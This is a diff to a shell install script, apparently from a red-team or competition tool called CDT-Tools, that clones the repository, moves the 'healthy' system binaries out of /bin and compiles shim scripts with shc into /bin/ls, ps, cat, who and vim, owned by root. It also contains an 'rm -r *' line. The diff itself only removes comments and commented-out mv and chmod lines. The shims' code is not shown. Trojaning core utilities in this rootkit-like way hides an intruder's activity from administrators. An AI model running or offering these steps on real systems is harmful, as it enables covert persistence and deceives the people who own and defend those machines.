@@ -30,11 +30,6 @@ rm -r *
 # Clone the repository
 git clone https://github.com/shadow5229/CDT-Tools.git
 
-# Or if you are hosting on a webserver, comment out the line above (git clone)
-# and uncomment the following lines
-
-# *** ADD WEBSERVER INSTALLTION HERE ***
-
 
 # Move "healthy" binaries out of /bin
 # Note: Some of these paths are OS dependent
@@ -51,20 +46,6 @@ shc -f CDT-Tools/ps_shim/ps_new -o /bin/ps
 shc -f CDT-Tools/cat_shim/cat_new -o /bin/cat
 shc -f CDT-Tools/who_shim/who_new -o /bin/who
 shc -f CDT-Tools/vim_shim/vim_new -o /bin/vim
-
-# Move the shim scripts into /bin with original names
-#mv CDT-Tools/ls_shim/ls_new /bin/ls
-#mv CDT-Tools/ps_shim/ps_new /bin/ps
-#mv CDT-Tools/cat_shim/cat_new /bin/cat
-#mv CDT-Tools/who_shim/who_new /bin/who
-#mv CDT-Tools/vim_shim/vim_new /bin/vim
-
-# Make each script executable
-#chmod +x /bin/ls 
-#chmod +x /bin/ps
-#chmod +x /bin/cat
-#chmod +x /bin/who
-#chmod +x /bin/vim
 
 # Set owner to root
 chown root:root /bin/ls
